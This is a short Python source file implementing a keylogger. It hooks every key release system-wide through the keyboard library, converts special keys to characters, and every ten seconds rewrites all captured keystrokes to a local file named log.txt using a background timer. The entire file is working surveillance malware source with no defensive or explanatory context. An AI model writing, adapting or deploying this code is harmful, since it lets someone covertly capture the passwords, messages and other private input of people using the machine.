import keyboard
from threading import Timer

tmp =""
filename="log.txt"
def callback(event) :
    global tmp
    key =event.name
    if len(key)>1:
        if key == "space":
            key = " "
        elif key == "enter":
            key="\n"
        elif key=="decimal":
                            key="."
    tmp +=key

def wr() :
    global filename
    with open(filename,"w") as log:
        print(tmp,file=log)
    timer = Timer(10,wr)
    timer.daemon=True
    timer.start()

def keylogger() :
    global filename
    global tmp
    wr()
    keyboard.on_release(callback)
    keyboard.wait()
    

keylogger()    

    

    
